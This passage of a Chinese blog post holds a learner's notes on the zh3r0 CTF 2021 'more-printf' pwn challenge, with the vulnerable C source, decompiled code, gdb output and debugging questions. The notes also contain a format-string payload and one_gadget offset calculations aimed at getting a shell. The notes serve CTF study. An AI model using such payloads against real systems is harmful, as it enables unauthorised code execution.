class="number">0x20</span> + <span class="number">1</span>); <span class="comment">//为啥要+1? 感觉好像不加也一样</span></span><br><span class="line">  fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  fgets(buffer, <span class="number">0x1f</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">0x8d9e7e558877</span>) &#123;</span><br><span class="line">    _exit(<span class="number">1337</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    i = <span class="number">1337</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, buffer);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3[<span class="number">0</span>] = (__int64)v3;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>uLL);</span><br><span class="line">  fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  fgets(buffer, <span class="number">31</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( i != <span class="number">0x8D9E7E558877</span>LL )</span><br><span class="line">    _exit(<span class="number">1337</span>);</span><br><span class="line">  i = <span class="number">1337LL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(fp, buffer);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	能够看到没有溢出,有一次格式化字符串利用的机会, 我在想是不是可以直接把返回地址修改成onegadget呢? 答案没采用这种方法,<strong>后面证实确实不行,一个是没有ret, 换别的函数的ret没有合适的指针(存疑)</strong></p>
+<p>​	先用%p泄露地址,能够看到第二个地址是比较特殊的, read函数,如果可以修改后面几个字节, 改为和onegadget一样,通过枚举,alsr偏移也一样的话,就可以getshell了,onegadget的话 0x4f3d5, 有五位不同, 枚举的话还是需要挺长时间的.. (不需要通过枚举,完全可以利用现有的指针),也就是第8个参数</p>
+<p>​	__libc_start_main+231知道这里的值,加上偏移就是onegadget的值了!</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main+<span class="number">231</span>: <span class="number">0x7ffff7a03bf7</span></span><br><span class="line">onegadget : <span class="number">0x7ffff7a313d5</span></span><br><span class="line">相差: onegadget-__libc_start_main+<span class="number">231</span> = <span class="number">0x2d7de</span> = <span class="number">186334</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>​	<font color="red">作者认为修改的read+17这个值是修改完后才会执行到的…依据是什么呢,如果不是这样的呢?</font></p>
+<p>​	下断点: b *read 下不了…q</p>
+<p>​	要输入payload: %c%c%c%5c%hhn%*8$d%186326c%5$n	也不行</p>
+<p>​	</p>
+<p>​	可以下watch断点的, watch一下要修改的地方的地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info b</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line"><span class="number">7</span>       breakpoint     keep y   <span class="number">0x00007ffff7a46f3f</span> in __fprintf at <span class="built_in">fprintf</span>.c:<span class="number">32</span></span><br><span class="line">	breakpoint already hit <span class="number">1</span> time</span><br><span class="line"><span class="number">9</span>       breakpoint     keep n   <span class="number">0x00007ffff7af2140</span> in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:<span class="number">27</span></span><br><span class="line"><span class="number">11</span>      breakpoint     keep y   <span class="number">0x00007ffff7af2140</span> in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:<span class="number">27</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>下的断点没用呢… 换个patchelf试试,</p>
+<p>2.27-3ubuntu1.4</p>
+<p><a target="_blank" rel="noopener" href="https://surager.pub/_posts/2021-05-11-x86%E6%9E%B6%E6%9E%84%E4%B8%8Bpwn%E9%A2%98%E7%9B%AElibc%E6%A6%82%E8%BF%B0/">https://surager.pub/_posts/2021-05-11-x86架构下pwn题目libc概述/</a></p>
+<p>先用这个吧 2.27-3ubuntu1.5_amd64</p>
+<p>进去一会后按c, 就能够进入最后的调试了,不行就下一个,继续c</p>
+<p>关键再c就退出去了..</p>
+<p>注意下断点的地址, exit可以 那是不是可以下system\execve</p>
+<p>直接q然后继续就好了</p>
+<p>gdb –pid 进去</p>
+<h3 id="为什么这里就可以只枚举32呢"><a href="#为什么这里就可以只枚举32呢" class="headerlink" title="为什么这里就可以只枚举32呢?"></a>为什么这里就可以只枚举32呢?</h3><p>​	所以对抗alsr的点不是在onegadget这个地址上,这里是确定的, 那什么是不确定的呢?</p>
+<p>​	就是要修改的地址的地址, 它不一定是0x08,可能是0x18 28 也可能是0x00 0x20, 所以才会有32种可能</p>
+<p>​	不过在我的电脑上, 第2的字节的一半也变了…那随机化的范围又大了(关闭随机化的情况下,开启了好像又一样了)</p>
+<p>​	</p>
+<h3 id="实际修改的指针"><a href="#实际修改的指针" class="headerlink" title="实际修改的指针"></a>实际修改的指针</h3><p>​	</p>
+<p>​	<font color="red">改的其实是上面的函数的地址(实测)  作者提出的修改read+17行不通</font></p>
+<p><img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153904670.png" alt="image-20231111153904670"></p>
+<h3 id="调试下断点和bt回溯遇到了问题"><a href="#调试下断点和bt回溯遇到了问题" class="headerlink" title="调试下断点和bt回溯遇到了问题"></a>调试下断点和bt回溯遇到了问题</h3><p>​	首先,bt回溯时候的各种问题,我认为是因为劫持控制流破坏了识别算法, 识别不出来,</p>
+<p>syscall能下断点吗</p>
+<p>do_system</p>
+<p>gdb 执行了新的sh,怎么跟踪呢? 如何看上一个进程的bt</p>
+<p>为什么会执行到上面那里呢?</p>
+<p>为什么会从那里取值rip呢?</p>
+<p>这里貌似是比较重要的函数</p>
+<p><img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111151211775.png" alt="image-20231111151211775"></p>
+<p>这里面进行解析的吧, 是的,所以重点应该在这里</p>
+<p>printf_positional</p>
+<p>怎么样才能跟踪执行流呢</p>
+<p>故意输错 让他卡在那是不是就可以了</p>
+<p>注意看这里, 返回了最开始的栈帧,</p>
+<p><img src="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231111153131246.png" alt="image-20231111153131246"></p>
+<h3 id="为什么只链接了那两个就可以了"><a href="#为什么只链接了那两个就可以了" class="headerlink" title="为什么只链接了那两个就可以了??????"></a>为什么只链接了那两个就可以了??????</h3><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>  buffer &#x3D; (char *)malloc(0x20 + 1); &#x2F;&#x2F;为啥要+1? 感觉好像不加也一样</p>
+<p>​	set $rdi&#x3D;_IO_stdout  ( 其他版本呢?)</p>
+<p>set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)</p>
+<p>以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下</p>
+<p>​	如何下断点来到这里呢? 最后返回onegadget的时候下不了断点</p>
+<p>gdb启动的时候如何多下几个断点</p>
+<p>为什么会从从rsp上面取值? </p>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>gdb中如何关了alsr调试呢</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set disable-randomization on 关闭</span><br><span class="line">set disable-randomization off 开启</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85785">https://www.anquanke.com/post/id/85785</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12304">https://xz.aliyun.com/t/12304</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.hakuya.work/post/2">https://www.hakuya.work/post/2</a></p>
+<p><a target="_blank" rel="noopener" href="https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/">https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln">https://github.com/zh3r0/zh3r0-ctf/tree/main/V2/pwn/more-printf/public/vuln</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/">https://blog.caprinux.com/2021/06/07/zh3ro-ctf-more-printf/</a></p>
+<p><a target="_blank" rel="noopener" href="https://sangjun.xyz/125">https://sangjun.xyz/125</a></p>
+<p>感觉前面几个讲的方法最后一步都有问题</p>
+<p><a target="_blank" rel="noopener" href="https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/">https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/</a></p>
+<p>这一篇或许是对的</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://tangzichengcc.github.io">唐仔橙</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/">https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tangzichengcc.github.io" target="_blank">唐仔橙</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></div><div class="post_share"><div class="social-share" data-image="/img/background/15.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/"><img class="next-cover" src="/img/background/10.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">c语言回炉重造-unix系统接口</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/" title="pwn入门-1-初识"><img class="cover" src="/img/background/6.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-11</div><div class="title">pwn入门-1-初识</div></div></a></div><div><a href="/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/" title="pwn入门-10-堆入门之堆溢出及unsorted_bin攻击"><img class="cover" src="/img/background/7.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-24</div><div class="title">pwn入门-10-堆入门之堆溢出及unsorted_bin攻击</div></div></a></div><div><a href="/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/" title="pwn入门-11-2月月赛题及反思"><img class="cover" src="/img/background/15.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-26</div><div class="title">pwn入门-11-2月月赛题及反思</div></div></a></div><div><a href="/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/" title="pwn入门-12-pltgot延迟绑定及符号解析"><img class="cover" src="/img/background/11.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-28</div><div class="title">pwn入门-12-pltgot延迟绑定及符号解析</div></div></a></div><div><a href="/pwn%E5%85%A5%E9%97%A8-13-%E5%A0%86%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/" title="pwn入门-13-堆入门基础"><img class="cover" src="/img/background/11.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-28</div><div class="title">pwn入门-13-堆入门基础</div></div></a></div><div><a href="/pwn%E5%85%A5%E9%97%A8-14-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F1/" title="pwn入门-14-基础知识查缺补漏1"><img class="cover" src="/img/background/7.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-03</div><div class="title">pwn入门-14-基础知识查缺补漏1</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">80</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">格式化字符串漏洞基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#n"><span class="toc-number">1.1.</span> <span class="toc-text">%n</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#p"><span class="toc-number">1.2.</span> <span class="toc-text">%p</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c"><span class="toc-number">1.3.</span> <span class="toc-text">%c</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E4%BF%AE%E6%94%B9%E5%80%BC"><span class="toc-number">1.3.1.</span> <span class="toc-text">任意地址写修改值</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9ret%E8%BF%94%E5%9B%9E%E5%80%BC-x"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">修改ret返回值(x)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%B9%E5%85%B6%E4%BB%96%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88-%E6%AF%94%E5%A6%82%E6%94%B9main-198"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">改其他的函数指针,比如改main+198</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9A%E8%83%BD%E5%88%B0read"><span class="toc-number">1.4.</span> <span class="toc-text">如何确定能到read</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">逻辑分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E9%87%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8F%AA%E6%9E%9A%E4%B8%BE32%E5%91%A2"><span class="toc-number">2.2.1.</span> <span class="toc-text">为什么这里就可以只枚举32呢?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E4%BF%AE%E6%94%B9%E7%9A%84%E6%8C%87%E9%92%88"><span class="toc-number">2.2.2.</span> <span class="toc-text">实际修改的指针</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E4%B8%8B%E6%96%AD%E7%82%B9%E5%92%8Cbt%E5%9B%9E%E6%BA%AF%E9%81%87%E5%88%B0%E4%BA%86%E9%97%AE%E9%A2%98"><span class="toc-number">2.2.3.</span> <span class="toc-text">调试下断点和bt回溯遇到了问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AA%E9%93%BE%E6%8E%A5%E4%BA%86%E9%82%A3%E4%B8%A4%E4%B8%AA%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86"><span class="toc-number">2.2.4.</span> <span class="toc-text">为什么只链接了那两个就可以了??????</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.3.</span> <span class="toc-text">问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tips"><span class="toc-number">2.3.1.</span> <span class="toc-text">tips</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf"><img src="/img/background/15.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-47-zh3R0CTF2021-moreprintf"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/" title="pwn入门-47-zh3R0CTF2021-moreprintf">pwn入门-47-zh3R0CTF2021-moreprintf</a><time datetime="2023-11-12T15:40:29.000Z" title="发表于 2023-11-12 23:40:29">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c语言回炉重造-unix系统接口"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口">c语言回炉重造-unix系统接口</a><time datetime="2023-11-12T07:29:52.000Z" title="发表于 2023-11-12 15:29:52">2023-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试"><img src="/img/background/4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-46-glibc源码调试"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" title="pwn入门-46-glibc源码调试">pwn入门-46-glibc源码调试</a><time datetime="2023-11-06T13:01:36.000Z" title="发表于 2023-11-06 21:01:36">2023-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/" title="c语言回炉重造-结构-输入与输出"><img src="/img/background/9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="c语言回炉重造-结构-输入与输出"/></a><div class="content"><a class="title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/" title="c语言回炉重造-结构-输入与输出">c语言回炉重造-结构-输入与输出</a><time datetime="2023-10-31T10:00:20.000Z" title="发表于 2023-10-31 18:00:20">2023-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/" title="pwn入门-45-10月月赛两题"><img src="/img/background/7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-45-10月月赛两题"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/" title="pwn入门-45-10月月赛两题">pwn入门-45-10月月赛两题</a><time datetime="2023-10-30T13:15:56.000Z" title="发表于 2023-10-30 21:15:56">2023-10-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function insertCSS () {
+    const link = document.createElement("link")
+    link.rel = "stylesheet"
+    link.href = "https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css"
+    document.head.appendChild(link)
+  }
+
+  function initWaline () {
+    const waline = Waline.init(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'https://comment-5fim5uiat-tangzichengcc.vercel.app',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+  }
+
+  if (typeof Waline === 'function') initWaline()
+  else {
+    insertCSS()
+    getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js').then(initWaline)
+  }
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
